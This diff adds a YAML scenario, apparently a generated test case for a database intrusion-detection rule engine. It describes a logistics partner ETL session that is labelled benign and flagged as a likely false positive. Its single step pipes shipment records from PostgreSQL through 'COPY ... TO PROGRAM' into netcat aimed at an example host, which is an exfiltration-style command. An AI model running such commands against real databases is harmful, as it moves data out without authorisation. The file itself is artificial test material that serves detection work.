@@ -1,0 +1,30 @@
+scenario_id: gen_logistics_66_copy_to_program_ben_1805b
+family_id: gen_logistics_66_copy_to_program_fam_1805
+domain: logistics
+time_of_day: 03:35
+default_class: benign
+rule_engine_relationship: benign_false_positive
+sessions:
+- session_label: exfil
+  role: partner_etl_service
+  anchor: db
+  timing:
+    tempo: steady
+    step_gaps_seconds:
+    - 8.0
+  events:
+  - step_id: dump
+    sql: COPY (SELECT shipment_id, status FROM shipments WHERE depot_id = 'DP-14')
+      TO PROGRAM 'nc clearinghouse-batch.example 443'
+    connects_to:
+      ip: 203.0.113.55
+      port: 9001
+matched_pair_id: gen_logistics_66_copy_to_program_pair_1805
+matched_dimensions:
+  fixed:
+  - process_tree_shape
+  - syscall_sequence
+  - timing_pattern
+  - role
+  varied:
+  - sql_content
